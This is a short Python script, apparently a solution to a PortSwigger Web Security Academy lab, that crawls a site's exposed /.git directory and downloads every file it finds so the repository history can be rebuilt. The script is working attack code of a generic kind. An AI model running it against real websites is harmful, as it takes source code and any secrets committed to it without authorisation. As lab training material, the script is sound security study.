# P https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-in-version-control-history
import requests
from bs4 import BeautifulSoup
import os
site = ""
s = requests.Session()
uris_visited = set()
uris_to_visit = ['/.git']
while len(uris_to_visit) > 0:
    current_uri = uris_to_visit.pop()
    print(f'Getting {current_uri}')
    resp = requests.get(f'https://{site}{current_uri}')
    uris_visited.add(current_uri)

    if 'Content-Type' in resp.headers.keys():
        # Content-Type of text/html for directories
        print(f'{current_uri} is a directory')
        soup = BeautifulSoup(resp.text,'html.parser')
        links = soup.find_all('a',href=True)
        for l in links:
            if (l['href'] not in uris_visited) and ('.git' in l['href']):
                uris_to_visit.append(l['href'])
    else:
        # No Content-Type returned for files.  Save locally
        dirpath = os.path.dirname(current_uri.lstrip('/'))
        print(dirpath)
        if not os.path.exists('tmp/' + dirpath):
            os.makedirs('tmp/' + dirpath)
        with open('tmp/' + current_uri.lstrip('/'),'wb+') as o:
            o.write(resp.content)
            o.close()